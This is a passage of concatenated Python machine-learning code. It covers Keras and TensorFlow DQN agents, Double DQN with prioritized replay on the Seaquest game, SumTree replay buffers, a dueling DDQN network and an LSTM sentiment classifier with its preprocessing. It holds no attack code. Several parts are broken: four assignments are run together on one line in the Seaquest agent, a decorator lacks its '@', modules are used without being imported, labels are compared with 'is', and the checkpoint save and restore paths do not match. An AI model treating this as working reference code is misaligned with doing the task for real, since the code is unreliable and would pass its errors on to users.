            model.add(Conv2D(256, (3, 3), input_shape=env.OBSERVATION_SPACE_VALUES))  # OBSERVATION_SPACE_VALUES = (10, 10, 3) a 10x10 RGB image.
            model.add(Activation('relu'))
            model.add(MaxPooling2D(pool_size=(2, 2)))
            model.add(Dropout(0.2))

            model.add(Conv2D(256, (3, 3)))
            model.add(Activation('relu'))
            model.add(MaxPooling2D(pool_size=(2, 2)))
            model.add(Dropout(0.2))

            model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors
            model.add(Dense(32))
        else:
            # model.add(Dense(32, activation="relu", input_shape=(env.n_states,)))
            # model.add(Dense(32, activation="relu"))
            # model.add(Dropout(0.2))
            # model.add(Dense(32, activation="relu"))
            # model.add(Dropout(0.2))
            model.add(LSTM(128, activation="relu", input_shape=(None, env.n_states,), return_sequences=True))
            model.add(Dropout(0.3))
            model.add(LSTM(128, activation="relu", return_sequences=True))
            model.add(Dropout(0.3))
            model.add(LSTM(128, activation="relu", return_sequences=False))
            model.add(Dropout(0.3))

        model.add(Dense(env.ACTION_SPACE_SIZE, activation='linear'))  # ACTION_SPACE_SIZE = how many choices (9)
        model.compile(loss="mse", optimizer=Adam(lr=0.001), metrics=['accuracy'])
        return model

    # Adds step's data to a memory replay array
    # (observation space, action, reward, new observation space, done)
    def update_replay_memory(self, transition):
        self.replay_memory.append(transition)

    # Trains main network every step during episode
    def train(self, terminal_state, step):

        # Start training only if certain number of samples is already saved
        if len(self.replay_memory) < MIN_REPLAY_MEMORY_SIZE:
            return

        # Get a minibatch of random samples from memory replay table
        minibatch = random.sample(self.replay_memory, MINIBATCH_SIZE)

        # Get current states from minibatch, then query NN model for Q values
        if self.state_in_image:
            current_states = np.array([transition[0] for transition in minibatch])/255
        else:
            current_states = np.array([transition[0] for transition in minibatch])
        current_qs_list = self.model.predict(np.expand_dims(current_states, axis=1))

        # Get future states from minibatch, then query NN model for Q values
        # When using target network, query it, otherwise main network should be queried
        if self.state_in_image:
            new_current_states = np.array([transition[3] for transition in minibatch])/255
        else:
            new_current_states = np.array([transition[3] for transition in minibatch])
        future_qs_list = self.target_model.predict(np.expand_dims(new_current_states, axis=1))

        X = []
        y = []

        # Now we need to enumerate our batches
        for index, (current_state, action, reward, new_current_state, done) in enumerate(minibatch):

            # If not a terminal state, get new q from future states, otherwise set it to 0
            # almost like with Q Learning, but we use just part of equation here
            if not done:
                max_future_q = np.max(future_qs_list[index])
                new_q = reward + DISCOUNT * max_future_q
            else:
                new_q = reward

            # Update Q value for given state
            current_qs = current_qs_list[index]
            current_qs[action] = new_q

            # And append to our training data
            X.append(current_state)
            y.append(current_qs)

        # Fit on all samples as one batch, log only on terminal state
        if self.state_in_image:
            self.model.fit(np.array(X)/255, np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)
        else:
            # self.model.fit(np.array(X), np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)
            self.model.fit(np.expand_dims(X, axis=1), np.array(y), batch_size=MINIBATCH_SIZE, verbose=0, shuffle=False, callbacks=[self.tensorboard] if terminal_state else None)


        # Update target network counter every episode
        if terminal_state:
            self.target_update_counter += 1

        # If counter reaches set value, update target network with weights of main network
        if self.target_update_counter > UPDATE_TARGET_EVERY:
            self.target_model.set_weights(self.model.get_weights())
            self.target_update_counter = 0

    # Queries main network for Q values given current observation space (environment state)
    def get_qs(self, state):
        if self.state_in_image:
            return self.model.predict(np.array(state).reshape(-1, *state.shape)/255)[0]
        else:
            # return self.model.predict(np.array(state).reshape(1, env.n_states))[0]
            return self.model.predict(np.array(state).reshape(1, 1, env.n_states))[0]


agent = DQNAgent(state_in_image=False)
print("Number of states:", env.n_states)
# agent.model.load_weights("models/2x32____22.00max___-2.44avg_-200.00min__1563463022.model")
# Iterate over episodes
for episode in tqdm(range(1, EPISODES + 1), ascii=True, unit='episodes'):

    # Update tensorboard step every episode
    agent.tensorboard.step = episode

    # Restarting episode - reset episode reward and step number
    episode_reward = 0
    step = 1

    # Reset environment and get initial state
    current_state = env.reset()

    # Reset flag and start iterating until episode ends
    done = False
    while not done:

        # This part stays mostly the same, the change is to query a model for Q values
        if np.random.random() > epsilon:
            # Get action from Q table
            action = np.argmax(agent.get_qs(current_state))
        else:
            # Get random action
            action = np.random.randint(0, env.ACTION_SPACE_SIZE)

        new_state, reward, done = env.step(action)

        # Transform new continous state to new discrete state and count reward
        episode_reward += reward

        if SHOW_PREVIEW and not episode % AGGREGATE_STATS_EVERY:
            env.render()

        # Every step we update replay memory and train main network
        agent.update_replay_memory((current_state, action, reward, new_state, done))
        agent.train(done, step)

        current_state = new_state
        step += 1

    # Append episode reward to a list and log stats (every given number of episodes)
    ep_rewards.append(episode_reward)
    if not episode % AGGREGATE_STATS_EVERY or episode == 1:
        average_reward = sum(ep_rewards[-AGGREGATE_STATS_EVERY:])/len(ep_rewards[-AGGREGATE_STATS_EVERY:])
        min_reward = min(ep_rewards[-AGGREGATE_STATS_EVERY:])
        max_reward = max(ep_rewards[-AGGREGATE_STATS_EVERY:])
        agent.tensorboard.update_stats(reward_avg=average_reward, reward_min=min_reward, reward_max=max_reward, epsilon=epsilon)

        # Save model, but only when min reward is greater or equal a set value
        if average_reward >= -220:
            agent.model.save(f'models/{MODEL_NAME}__{max_reward:_>7.2f}max_{average_reward:_>7.2f}avg_{min_reward:_>7.2f}min__{int(time.time())}.model')

    # Decay epsilon
    if epsilon > MIN_EPSILON:
        epsilon *= EPSILON_DECAY
        epsilon = max(MIN_EPSILON, epsilon)
    
agent.model.save(f'models/{MODEL_NAME}__{max_reward:_>7.2f}max_{average_reward:_>7.2f}avg_{min_reward:_>7.2f}min__{int(time.time())}.model')




# OpenGym Seaquest-v0
# -------------------
#
# This code demonstrates a Double DQN network with Priority Experience Replay
# in an OpenGym Seaquest-v0 environment.
#
# Made as part of blog series Let's make a DQN, available at: 
# https://jaromiru.com/2016/11/07/lets-make-a-dqn-double-learning-and-prioritized-experience-replay/
# 
# author: Jaromir Janisch, 2016

import matplotlib
import random, numpy, math, gym, scipy
import tensorflow as tf
import time
from SumTree import SumTree
from keras.callbacks import TensorBoard
from collections import deque
import tqdm

IMAGE_WIDTH = 84
IMAGE_HEIGHT = 84
IMAGE_STACK = 2

HUBER_LOSS_DELTA = 2.0
LEARNING_RATE = 0.00045


#-------------------- Modified Tensorboard -----------------------
class RLTensorBoard(TensorBoard):

    def __init__(self, **kwargs):
        """
        Overriding init to set initial step and writer (one log file for multiple .fit() calls)
        """
        super().__init__(**kwargs)
        self.step = 1
        self.writer = tf.summary.FileWriter(self.log_dir)

    def set_model(self, model):
        """
        Overriding this method to stop creating default log writer
        """
        pass

    def on_epoch_end(self, epoch, logs=None):
        """
        Overrided, saves logs with our step number
        (if this is not overrided, every .fit() call will start from 0th step)
        """
        self.update_stats(**logs)

    def on_batch_end(self, batch, logs=None):
        """
        Overrided, we train for one batch only, no need to save anything on batch end
        """
        pass

    def on_train_end(self, _):
        """
        Overrided, we don't close the writer
        """
        pass

    def update_stats(self, **stats):
        """
        Custom method for saving own metrics
        Creates writer, writes custom metrics and closes writer
        """
        self._write_logs(stats, self.step)

#-------------------- UTILITIES -----------------------
def huber_loss(y_true, y_pred):
    err = y_true - y_pred

    cond = K.abs(err) < HUBER_LOSS_DELTA
    L2 = 0.5 * K.square(err)
    L1 = HUBER_LOSS_DELTA * (K.abs(err) - 0.5 * HUBER_LOSS_DELTA)

    loss = tf.where(cond, L2, L1)   # Keras does not cover where function in tensorflow :-(

    return K.mean(loss)

def processImage( img ):
    rgb = scipy.misc.imresize(img, (IMAGE_WIDTH, IMAGE_HEIGHT), interp='bilinear')

    r, g, b = rgb[:,:,0], rgb[:,:,1], rgb[:,:,2]
    gray = 0.2989 * r + 0.5870 * g + 0.1140 * b     # extract luminance

    o = gray.astype('float32') / 128 - 1    # normalize
    return o

#-------------------- BRAIN ---------------------------
from keras.models import Sequential
from keras.layers import *
from keras.optimizers import *

model_name = "conv2dx3"

class Brain:
    def __init__(self, stateCnt, actionCnt):
        self.stateCnt = stateCnt
        self.actionCnt = actionCnt

        self.model = self._createModel()
        self.model_ = self._createModel()  # target network
        # custom tensorboard
        self.tensorboard = RLTensorBoard(log_dir="logs/{}-{}".format(model_name, int(time.time())))

    def _createModel(self):
        model = Sequential()

        model.add(Conv2D(32, (8, 8), strides=(4,4), activation='relu', input_shape=(self.stateCnt), data_format='channels_first'))
        model.add(Conv2D(64, (4, 4), strides=(2,2), activation='relu'))
        model.add(Conv2D(64, (3, 3), activation='relu'))
        model.add(Flatten())
        model.add(Dense(units=512, activation='relu'))

        model.add(Dense(units=actionCnt, activation='linear'))

        opt = RMSprop(lr=LEARNING_RATE)
        model.compile(loss=huber_loss, optimizer=opt)

        return model

    def train(self, x, y, epochs=1, verbose=0):
        self.model.fit(x, y, batch_size=32, epochs=epochs, verbose=verbose, callbacks=[self.tensorboard])

    def predict(self, s, target=False):
        if target:
            return self.model_.predict(s)
        else:
            return self.model.predict(s)

    def predictOne(self, s, target=False):
        return self.predict(s.reshape(1, IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT), target).flatten()

    def updateTargetModel(self):
        self.model_.set_weights(self.model.get_weights())

#-------------------- MEMORY --------------------------
class Memory:   # stored as ( s, a, r, s_ ) in SumTree
    e = 0.01
    a = 0.6

    def __init__(self, capacity):
        self.tree = SumTree(capacity)

    def _getPriority(self, error):
        return (error + self.e) ** self.a

    def add(self, error, sample):
        p = self._getPriority(error)
        self.tree.add(p, sample) 

    def sample(self, n):
        batch = []
        segment = self.tree.total() / n

        for i in range(n):
            a = segment * i
            b = segment * (i + 1)

            s = random.uniform(a, b)
            (idx, p, data) = self.tree.get(s)
            batch.append( (idx, data) )

        return batch

    def update(self, idx, error):
        p = self._getPriority(error)
        self.tree.update(idx, p)

#-------------------- AGENT ---------------------------
MEMORY_CAPACITY = 50_000

BATCH_SIZE = 32

GAMMA = 0.95

MAX_EPSILON = 1
MIN_EPSILON = 0.05

EXPLORATION_STOP = 500_000   # at this step epsilon will be 0.01
LAMBDA = - math.log(0.01) / EXPLORATION_STOP  # speed of decay

UPDATE_TARGET_FREQUENCY = 10_000
UPDATE_STATS_EVERY = 5
RENDER_EVERY = 50

class Agent:
    steps = 0
    epsilon = MAX_EPSILON

    def __init__(self, stateCnt, actionCnt, brain):
        self.stateCnt = stateCnt
        self.actionCnt = actionCnt

        self.brain = brain
        # self.memory = Memory(MEMORY_CAPACITY)
        
    def act(self, s):
        if random.random() < self.epsilon:
            return random.randint(0, self.actionCnt-1)
        else:
            return numpy.argmax(self.brain.predictOne(s))

    def observe(self, sample):  # in (s, a, r, s_) format
        x, y, errors = self._getTargets([(0, sample)])
        self.memory.add(errors[0], sample)

        if self.steps % UPDATE_TARGET_FREQUENCY == 0:
            self.brain.updateTargetModel()

        # slowly decrease Epsilon based on our eperience
        self.steps += 1
        self.epsilon = MIN_EPSILON + (MAX_EPSILON - MIN_EPSILON) * math.exp(-LAMBDA * self.steps)

    def _getTargets(self, batch):
        no_state = numpy.zeros(self.stateCnt)

        states = numpy.array([ o[1][0] for o in batch ])
        states_ = numpy.array([ (no_state if o[1][3] is None else o[1][3]) for o in batch ])

        p = agent.brain.predict(states)

        p_ = agent.brain.predict(states_, target=False)
        pTarget_ = agent.brain.predict(states_, target=True)

        x = numpy.zeros((len(batch), IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT))
        y = numpy.zeros((len(batch), self.actionCnt))
        errors = numpy.zeros(len(batch))
        
        for i in range(len(batch)):
            o = batch[i][1]
            s = o[0] a = o[1] r = o[2] s_ = o[3]
            
            t = p[i]
            oldVal = t[a]
            if s_ is None:
                t[a] = r
            else:
                t[a] = r + GAMMA * pTarget_[i][ numpy.argmax(p_[i]) ]  # double DQN

            x[i] = s
            y[i] = t
            errors[i] = abs(oldVal - t[a])

        return (x, y, errors)

    def replay(self):    
        batch = self.memory.sample(BATCH_SIZE)
        x, y, errors = self._getTargets(batch)

        # update errors
        for i in range(len(batch)):
            idx = batch[i][0]
            self.memory.update(idx, errors[i])

        self.brain.train(x, y)

class RandomAgent:
    memory = Memory(MEMORY_CAPACITY)
    exp = 0
    epsilon = MAX_EPSILON

    def __init__(self, actionCnt, brain):
        self.actionCnt = actionCnt
        self.brain = brain

    def act(self, s):
        return random.randint(0, self.actionCnt-1)

    def observe(self, sample):  # in (s, a, r, s_) format
        error = abs(sample[2])  # reward
        self.memory.add(error, sample)
        self.exp += 1

    def replay(self):
        pass

#-------------------- ENVIRONMENT ---------------------
class Environment:
    def __init__(self, problem):
        self.problem = problem
        self.env = gym.make(problem)
        self.ep_rewards = deque(maxlen=UPDATE_STATS_EVERY)

    def run(self, agent, step):                
        img = self.env.reset()
        w = processImage(img)
        s = numpy.array([w, w])
        agent.brain.tensorboard.step = step
        R = 0
        while True:
            if step % RENDER_EVERY == 0:
                self.env.render()
            a = agent.act(s)

            img, r, done, info = self.env.step(a)
            s_ = numpy.array([s[1], processImage(img)]) #last two screens

            r = np.clip(r, -1, 1)   # clip reward to [-1, 1]

            if done: # terminal state
                s_ = None

            agent.observe( (s, a, r, s_) )
            agent.replay()            

            s = s_
            R += r

            if done:
                break

        
        self.ep_rewards.append(R)
        avg_reward = sum(self.ep_rewards) / len(self.ep_rewards)
        if step % UPDATE_STATS_EVERY == 0:
            min_reward = min(self.ep_rewards)
            max_reward = max(self.ep_rewards)
            agent.brain.tensorboard.update_stats(reward_avg=avg_reward, reward_min=min_reward, reward_max=max_reward, epsilon=agent.epsilon)
            agent.brain.model.save(f"models/{model_name}-avg-{avg_reward:.2f}-min-{min_reward:.2f}-max-{max_reward:2f}.h5")
        # print("Total reward:", R)
        return avg_reward

#-------------------- MAIN ----------------------------
PROBLEM = 'Seaquest-v0'
env = Environment(PROBLEM)

episodes = 2_000

stateCnt  = (IMAGE_STACK, IMAGE_WIDTH, IMAGE_HEIGHT)
actionCnt = env.env.action_space.n

brain = Brain(stateCnt, actionCnt)

agent = Agent(stateCnt, actionCnt, brain)
randomAgent = RandomAgent(actionCnt, brain)

step = 0
try:
    print("Initialization with random agent...")
    while randomAgent.exp < MEMORY_CAPACITY:
        step += 1
        env.run(randomAgent, step)
        print(randomAgent.exp, "/", MEMORY_CAPACITY)

    agent.memory = randomAgent.memory

    randomAgent = None

    print("Starting learning")
    for i in tqdm.tqdm(list(range(step+1, episodes+step+1))):
        env.run(agent, i)
finally:
    agent.brain.model.save("Seaquest-DQN-PER.h5")




import numpy as np

class SumTree:
    """
    This SumTree code is modified version of Morvan Zhou: 
    https://github.com/MorvanZhou/Reinforcement-learning-with-tensorflow/blob/master/contents/5.2_Prioritized_Replay_DQN/RL_brain.py
    """
    data_pointer = 0
    def __init__(self, length):
        # number of leaf nodes (final nodes that contains experiences)
        self.length = length

        # generate the tree with all nodes' value = 0
        # binary node (each node has max 2 children) so 2x size of leaf capacity - 1
        # parent nodes = length - 1
        # leaf nodes = length
        self.tree = np.zeros(2*self.length - 1)
        # contains the experiences
        self.data = np.zeros(self.length, dtype=object)

    def add(self, priority, data):
        """
        Add priority score in the sumtree leaf and add the experience in data
        """
        # look at what index we want to put the experience
        tree_index = self.data_pointer + self.length - 1
        
        #tree:
        #           0
        #           / \
        #          0   0
        #         / \ / \
       #tree_index  0 0  0  We fill the leaves from left to right

        self.data[self.data_pointer] = data

        # update the leaf
        self.update(tree_index, priority)

        # increment data pointer
        self.data_pointer += 1

        # if we're above the capacity, we go back to the first index
        if self.data_pointer >= self.length:
            self.data_pointer = 0


    def update(self, tree_index, priority):
        """
        Update the leaf priority score and propagate the change through the tree
        """

        # change = new priority score - former priority score
        change = priority - self.tree[tree_index]
        self.tree[tree_index] = priority

        while tree_index != 0:    # this method is faster than the recursive loop in the reference code
            
            """
            Here we want to access the line above
            THE NUMBERS IN THIS TREE ARE THE INDEXES NOT THE PRIORITY VALUES
            
                0
               / \
              1   2
             / \ / \
            3  4 5  [6] 
            
            If we are in leaf at index 6, we updated the priority score
            We need then to update index 2 node
            So tree_index = (tree_index - 1) // 2
            tree_index = (6-1)//2
            tree_index = 2 (because // round the result)
            """
            tree_index = (tree_index - 1) // 2
            self.tree[tree_index] += change

        
    """
    Here we get the leaf_index, priority value of that leaf and experience associated with that index
    """
    def get_leaf(self, v):
        """
        Tree structure and array storage:
        Tree index:
             0         -> storing priority sum
            / \
          1     2
         / \   / \
        3   4 5   6    -> storing priority for experiences
        Array type for storing:
        [0,1,2,3,4,5,6]
        """
        parent_index = 0
        
        while True: # the while loop is faster than the method in the reference code
            left_child_index = 2 * parent_index + 1
            right_child_index = left_child_index + 1
            
            # If we reach bottom, end the search
            if left_child_index >= len(self.tree):
                leaf_index = parent_index
                break
            
            else: # downward search, always search for a higher priority node
                
                if v <= self.tree[left_child_index]:
                    parent_index = left_child_index
                    
                else:
                    v -= self.tree[left_child_index]
                    parent_index = right_child_index
            
        data_index = leaf_index - self.length + 1

        return leaf_index, self.tree[leaf_index], self.data[data_index]
    
    property
    def total_priority(self):
        return self.tree[0] # Returns the root node



class Memory:
    # we use this to avoid some experiences to have 0 probability of getting picked
    PER_e = 0.01
    # we use this to make a tradeoff between taking only experiences with high priority
    # and sampling randomly
    PER_a = 0.6
    # we use this for importance sampling, from this to 1 through the training
    PER_b = 0.4

    PER_b_increment_per_sample = 0.001

    absolute_error_upper = 1.0

    def __init__(self, capacity):
        # the tree is composed of a sum tree that contains the priority scores and his leaf
        # and also a data list
        # we don't use deque here because it means that at each timestep our experiences change index by one
        # we prefer to use a simple array to override when the memory is full
        self.tree = SumTree(length=capacity)

    def store(self, experience):
        """
        Store a new experience in our tree
        Each new experience have a score of max_priority (it'll be then improved)
        """
        # find the max priority
        max_priority = np.max(self.tree.tree[-self.tree.length:])

        # if the max priority = 0 we cant put priority = 0 since this exp will never have a chance to be picked
        # so we use a minimum priority
        if max_priority == 0:
            max_priority = self.absolute_error_upper
        
        # set the max p for new p
        self.tree.add(max_priority, experience)

    def sample(self, n):
        """
        - First, to sample a minimatch of k size, the range [0, priority_total] is / into k ranges.
        - then a value is uniformly sampled from each range
        - we search in the sumtree, the experience where priority score correspond to sample values are 
        retrieved from.
        - then, we calculate IS weights for each minibatch element 
        """
        # create a sample list that will contains the minibatch
        memory = []

        b_idx, b_is_weights = np.zeros((n, ), dtype=np.int32), np.zeros((n, 1), dtype=np.float32)

        # calculate the priority segment
        # here, as explained in the paper, we divide the range [0, ptotal] into n ranges
        priority_segment = self.tree.total_priority / n

        # increase b each time 
        self.PER_b = np.min([1., self.PER_b + self.PER_b_increment_per_sample])

        # calculating the max weight
        p_min = np.min(self.tree.tree[-self.tree.length:]) / self.tree.total_priority
        max_weight = (p_min * n) ** (-self.PER_b)

        for i in range(n):
            a, b = priority_segment * i, priority_segment * (i + 1)
            value = np.random.uniform(a, b)

            # experience that correspond to each value is retrieved
            index, priority, data = self.tree.get_leaf(value)

            # P(j)
            sampling_probs = priority / self.tree.total_priority

            # IS = (1/N * 1/P(i))**b /max wi == (N*P(i))**-b  /max wi
            b_is_weights[i, 0] = np.power(n * sampling_probs, -self.PER_b)/ max_weight

            b_idx[i]= index

            experience = [data]

            memory.append(experience)

        return b_idx, memory, b_is_weights

    

    def batch_update(self, tree_idx, abs_errors):
        """
        Update the priorities on the tree
        """
        abs_errors += self.PER_e
        clipped_errors = np.min([abs_errors, self.absolute_error_upper])
        ps = np.power(clipped_errors, self.PER_a)

        for ti, p in zip(tree_idx, ps):
            self.tree.update(ti, p)




import tensorflow as tf

class DDDQNNet:
    """ Dueling Double Deep Q Neural Network """
    def __init__(self, state_size, action_size, learning_rate, name):
        self.state_size = state_size
        self.action_size = action_size
        self.learning_rate = learning_rate
        self.name = name

        # we use tf.variable_scope to know which network we're using (DQN or the Target net)
        # it'll be helpful when we will update our w- parameters (by copy the DQN parameters)
        with tf.variable_scope(self.name):
            # we create the placeholders
            self.inputs_ = tf.placeholder(tf.float32, [None, *state_size], name="inputs")

            self.is_weights_ = tf.placeholder(tf.float32, [None, 1], name="is_weights")

            self.actions_ = tf.placeholder(tf.float32, [None, self.action_size], name="actions_")

            # target Q
            self.target_q = tf.placeholder(tf.float32, [None], name="target")

            # neural net
            self.dense1 = tf.layers.dense(inputs=self.inputs_,
                                          units=32,
                                          name="dense1",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                          activation="relu")
            
            self.dense2 = tf.layers.dense(inputs=self.dense1,
                                          units=32,
                                          name="dense2",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                          activation="relu")

            self.dense3 = tf.layers.dense(inputs=self.dense2,
                                          units=32,
                                          name="dense3",
                                          kernel_initializer=tf.contrib.layers.xavier_initializer())

            # here we separate into two streams (dueling)
            # this one is State-Function V(s)
            self.value = tf.layers.dense(inputs=self.dense3,
                                         units=1,
                                         kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                         activation=None,
                                         name="value"
                                         )

            # and this one is Value-Function A(s, a)
            self.advantage = tf.layers.dense(inputs=self.dense3,
                                             units=self.action_size,
                                             activation=None,
                                             kernel_initializer=tf.contrib.layers.xavier_initializer(),
                                             name="advantage"
                                             )

            # aggregation
            # Q(s, a) = V(s) + ( A(s, a) - 1/|A| * sum A(s, a') )

            self.output = self.value + tf.subtract(self.advantage, tf.reduce_mean(self.advantage, axis=1, keepdims=True))

            # Q is our predicted Q value
            self.Q = tf.reduce_sum(tf.multiply(self.output, self.actions_))

            self.absolute_errors = tf.abs(self.target_q - self.Q)

            # w- * (target_q - q)**2
            self.loss = tf.reduce_mean(self.is_weights_ * tf.squared_difference(self.target_q, self.Q))


            self.optimizer = tf.train.RMSPropOptimizer(self.learning_rate).minimize(self.loss)




import numpy

class SumTree:
    write = 0

    def __init__(self, capacity):
        self.capacity = capacity
        self.tree = numpy.zeros( 2*capacity - 1 )
        self.data = numpy.zeros( capacity, dtype=object )

    def _propagate(self, idx, change):
        parent = (idx - 1) // 2

        self.tree[parent] += change

        if parent != 0:
            self._propagate(parent, change)

    def _retrieve(self, idx, s):
        left = 2 * idx + 1
        right = left + 1

        if left >= len(self.tree):
            return idx

        if s <= self.tree[left]:
            return self._retrieve(left, s)
        else:
            return self._retrieve(right, s-self.tree[left])

    def total(self):
        return self.tree[0]

    def add(self, p, data):
        idx = self.write + self.capacity - 1

        self.data[self.write] = data
        self.update(idx, p)

        self.write += 1
        if self.write >= self.capacity:
            self.write = 0

    def update(self, idx, p):
        change = p - self.tree[idx]

        self.tree[idx] = p
        self._propagate(idx, change)

    def get(self, s):
        idx = self._retrieve(0, s)
        dataIdx = idx - self.capacity + 1

        return (idx, self.tree[idx], self.data[dataIdx])




import numpy as np

from string import punctuation
from collections import Counter
from sklearn.model_selection import train_test_split


with open("data/reviews.txt") as f:
    reviews = f.read()

with open("data/labels.txt") as f:
    labels = f.read()

# remove all punctuations
all_text = ''.join([ c for c in reviews if c not in punctuation ])

reviews = all_text.split("\n")
reviews = [ review.strip() for review in reviews ]
all_text = ' '.join(reviews)
words = all_text.split()
print("Total words:", len(words))

# encoding the words

# dictionary that maps vocab words to integers here
vocab = sorted(set(words))
print("Unique words:", len(vocab))
# start is 1 because 0 is encoded for blank
vocab2int = {word: i for i, word in enumerate(vocab, start=1)}

# encoded reviews
encoded_reviews = []
for review in reviews:
    encoded_reviews.append([vocab2int[word] for word in review.split()])

encoded_reviews = np.array(encoded_reviews)
# print("Number of reviews:", len(encoded_reviews))

# encode the labels, 1 for 'positive' and 0 for 'negative'
labels = labels.split("\n")
labels = [1 if label is 'positive' else 0 for label in labels]
# print("Number of labels:", len(labels))

review_lens = [len(x) for x in encoded_reviews]
counter_reviews_lens = Counter(review_lens)

# remove any reviews with 0 length
cleaned_encoded_reviews, cleaned_labels = [], []
for review, label in zip(encoded_reviews, labels):
    if len(review) != 0:
        cleaned_encoded_reviews.append(review)
        cleaned_labels.append(label)

encoded_reviews = np.array(cleaned_encoded_reviews)
labels = cleaned_labels
# print("Number of reviews:", len(encoded_reviews))
# print("Number of labels:", len(labels))

sequence_length = 200
features = np.zeros((len(encoded_reviews), sequence_length), dtype=int)
for i, review in enumerate(encoded_reviews):
    features[i, -len(review):] = review[:sequence_length]

# print(features[:10, :100])

# split data into train, validation and test
split_frac = 0.9

X_train, X_test, y_train, y_test = train_test_split(features, labels, test_size=1-split_frac)
X_test, X_validation, y_test, y_validation = train_test_split(X_test, y_test, test_size=0.5)

print(f"""Features shapes:
Train set:      {X_train.shape}
Validation set: {X_validation.shape}
Test set:       {X_test.shape}""")
print("Example:")
print(X_train[0])
print(y_train[0])

# X_train, X_validation = features[:split_frac*len(features)], features[split_frac*len(features):]
# y_train, y_validation = labels[:split]




import tensorflow as tf
from utils import get_batches
from train import *




import tensorflow as tf
from preprocess import vocab2int, X_train, y_train, X_validation, y_validation, X_test, y_test
from utils import get_batches

import numpy as np

def get_lstm_cell():
    # basic LSTM cell
    lstm = tf.contrib.rnn.BasicLSTMCell(lstm_size)

    # dropout to the cell
    drop = tf.contrib.rnn.DropoutWrapper(lstm, output_keep_prob=keep_prob)

    return drop

# RNN paramaters
lstm_size = 256
lstm_layers = 1
batch_size = 256
learning_rate = 0.001

n_words = len(vocab2int) + 1 # Added 1 for the 0 that is for padding

# create the graph object
graph = tf.Graph()
# add nodes to the graph
with graph.as_default():
    inputs = tf.placeholder(tf.int32, (None, None), "inputs")
    labels = tf.placeholder(tf.int32, (None, None), "labels")
    keep_prob = tf.placeholder(tf.float32, name="keep_prob")

# number of units in the embedding layer
embedding_size = 300

with graph.as_default():
    # embedding lookup matrix
    embedding = tf.Variable(tf.random_uniform((n_words, embedding_size), -1, 1))
    # pass to the LSTM cells
    embed = tf.nn.embedding_lookup(embedding, inputs)

    # stackup multiple LSTM layers
    cell = tf.contrib.rnn.MultiRNNCell([get_lstm_cell() for i in range(lstm_layers)])

    initial_state = cell.zero_state(batch_size, tf.float32)

    # pass cell and input to cell, returns outputs for each time step
    # and the final state of the hidden layer
    # run the data through the rnn nodes
    outputs, final_state = tf.nn.dynamic_rnn(cell, embed, initial_state=initial_state)

    # grab the last output
    # use sigmoid for binary classification
    predictions = tf.contrib.layers.fully_connected(outputs[:, -1], 1, activation_fn=tf.sigmoid)

    # calculate cost using MSE
    cost = tf.losses.mean_squared_error(labels, predictions)
    optimizer = tf.train.AdamOptimizer(learning_rate).minimize(cost)

    # nodes to calculate the accuracy
    correct_pred = tf.equal(tf.cast(tf.round(predictions), tf.int32), labels)
    accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32))

    saver = tf.train.Saver()

########### training ##########
epochs = 10

with tf.Session(graph=graph) as sess:
    sess.run(tf.global_variables_initializer())
    iteration = 1

    for e in range(epochs):
        state = sess.run(initial_state)

        for i, (x, y) in enumerate(get_batches(X_train, y_train, batch_size=batch_size)):
            y = np.array(y)
            x = np.array(x)
            feed = {inputs: x, labels: y[:, None],
                    keep_prob: 0.5,
                    initial_state: state}
            loss, state, _ = sess.run([cost, final_state, optimizer], feed_dict=feed)

            if iteration % 5 == 0:
                print(f"[Epoch: {e}/{epochs}] Iteration: {iteration} Train loss: {loss:.3f}")
            
            if iteration % 25 == 0:
                val_acc = []
                val_state = sess.run(cell.zero_state(batch_size, tf.float32))
                for x, y in get_batches(X_validation, y_validation, batch_size=batch_size):
                    x, y = np.array(x), np.array(y)
                    feed = {inputs: x, labels: y[:, None],
                            keep_prob: 1, initial_state: val_state}
                    batch_acc, val_state = sess.run([accuracy, final_state], feed_dict=feed)
                    val_acc.append(batch_acc)
                print(f"val_acc: {np.mean(val_acc):.3f}")

            iteration += 1

    saver.save(sess, "chechpoints/sentiment1.ckpt")

test_acc = []
with tf.Session(graph=graph) as sess:
    saver = tf.train.Saver()
    saver.restore(sess, tf.train.latest_checkpoint('checkpoints'))
    test_state = sess.run(cell.zero_state(batch_size, tf.float32))
    for ii, (x, y) in enumerate(get_batches(X_test, y_test, batch_size), 1):
        feed = {inputs: x,
                labels: y[:, None],
                keep_prob: 1,
                initial_state: test_state}
        batch_acc, test_state = sess.run([accuracy, final_state], feed_dict=feed)
        test_acc.append(batch_acc)
    print("Test accuracy: {:.3f}".format(np.mean(test_acc)))




def get_batches(x, y, batch_size=100):

    n_batches = len(x) // batch_size
    x, y = x[:n_batches*batch_size], y[:n_batches*batch_size]
    for i in range(0, len(x), batch_size):
        yield x[i: i+batch_size], y[i: i+batch_size]




import numpy as np
import pandas as pd
import tqdm
from string import punctuation

punc = set(punctuation)

df = pd.read_csv(r"E:\datasets\sentiment\food_reviews\amazon-fine-food-reviews\Reviews.csv")


X = np.zeros((len(df), 2), dtype=object)

for i in tqdm.tqdm(range(len(df)), "Cleaning X"):
    target = df['Text'].loc[i]

    # X.append(''.join([ c.lower() for c in target if c not in punc ]))
    X[i, 0] = ''.join([ c.lower() for c in target if c not in punc ])
    X[i, 1] = df['Score'].loc[i]


pd.DataFrame(X, columns=["Text", "Score"]).to_csv("data/Reviews.csv")




### Model Architecture hyper parameters
embedding_size = 64
# sequence_length = 500
sequence_length = 42
LSTM_units = 128

### Training parameters
batch_size = 128
epochs = 20

### Preprocessing parameters
# words that occur less than n times to be deleted from dataset
N = 10

# test size in ratio, train size is 1 - test_size
test_size = 0.15




from keras.models import Sequential
from keras.layers import Embedding, LSTM, Dense, Activation, LeakyReLU, Dropout, TimeDistributed
from keras.layers import SpatialDropout1D
from config import LSTM_units


def get_model_binary(vocab_size, sequence_length):
    embedding_size = 64
    model=Sequential()
    model.add(Embedding(vocab_size, embedding_size, input_length=sequence_length))
    model.add(SpatialDropout1D(0.15))
